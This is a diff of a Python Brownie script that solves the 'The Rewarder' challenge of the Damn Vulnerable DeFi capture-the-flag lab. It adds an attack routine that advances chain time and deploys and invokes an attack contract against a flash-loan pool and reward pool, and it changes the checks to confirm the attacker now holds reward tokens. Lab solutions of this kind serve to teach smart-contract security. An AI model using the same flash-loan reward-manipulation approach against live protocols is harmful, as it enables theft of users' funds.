@@ -4,6 +4,7 @@ from brownie import (
     DamnValuableToken,
     RewardToken,
     AccountingToken,
+    AttackTheRewarder,
 )
 from web3 import Web3
 from brownie import web3
@@ -13,7 +14,7 @@ from scripts.helpful_scripts import get_accounts
 
 
 def deploy():
-    global deployer, alice, bob, charlie, attacker, therewarderPool, rewardToken
+    global deployer, alice, bob, charlie, attacker, users, therewarderPool, therewardToken, liquidityToken, flashLoanPool
     [
         deployer,
         alice,
@@ -36,7 +37,7 @@ def deploy():
     therewarderPool = TheRewarderPool.deploy(liquidityToken, {"from": deployer})
 
     # 文档： https://eth-brownie.readthedocs.io/en/stable/api-network.html#contractcontainer
-    rewardToken = RewardToken.at(therewarderPool.rewardToken())
+    therewardToken = RewardToken.at(therewarderPool.rewardToken())
     accountingToken = AccountingToken.at(therewarderPool.accToken())
     for user in users:
         amount = Web3.toWei(100, "ether")
@@ -46,7 +47,7 @@ def deploy():
         assert accountingToken.balanceOf(user) == amount
 
     assert accountingToken.totalSupply() == Web3.toWei(400, "ether")
-    assert rewardToken.totalSupply() == 0
+    assert therewardToken.totalSupply() == 0
 
     # 在区块链上的timestap 增加5天
     sec_5_days = 5 * 24 * 60 * 60
@@ -54,9 +55,9 @@ def deploy():
 
     for user in users:
         therewarderPool.distributeRewards({"from": user}).wait(1)
-        assert rewardToken.balanceOf(user) == Web3.toWei(25, "ether")
+        assert therewardToken.balanceOf(user) == Web3.toWei(25, "ether")
 
-    assert rewardToken.totalSupply() == Web3.toWei(100, "ether")
+    assert therewardToken.totalSupply() == Web3.toWei(100, "ether")
     assert therewarderPool.roundNumber() == 2
 
     return
@@ -65,6 +66,17 @@ def deploy():
 def attack():
     # 攻击代码写到这里
     print("running func attack..")
+    # 在区块链上的timestap 增加5天
+    sec_5_days = 5 * 24 * 60 * 60
+    web3.provider.make_request("evm_increaseTime", [sec_5_days])
+    attack_contract = AttackTheRewarder.deploy({"from": attacker})
+    attack_contract.attack(
+        liquidityToken,
+        therewardToken,
+        flashLoanPool,
+        therewarderPool,
+        {"from": attacker},
+    ).wait(1)
 
     return
 
@@ -73,12 +85,12 @@ def check():
     # 检测攻击是否完成
     print("running func check..")
     try:
-        assert rewarderPool.roundNumber() == Web3.toWei(3, "ether")
+        assert therewarderPool.roundNumber() == 3
         for user in users:
-            rewarderPool.distributeRewards({"from": user}).wait(1)
-            assert rewardToken.balanceOf(user) == Web3.toWei(25, "ether")
-        assert rewardToken.totalSupply() == Web3.toWei(100, "ether")
-        assert rewardToken.balanceOf(attacker) == 0
+            therewarderPool.distributeRewards({"from": user}).wait(1)
+            assert therewardToken.balanceOf(user) == Web3.toWei(25, "ether")
+        assert therewardToken.totalSupply() > Web3.toWei(100, "ether")
+        assert therewardToken.balanceOf(attacker) > 0
         print("success!")
     except:
         time.sleep(1)
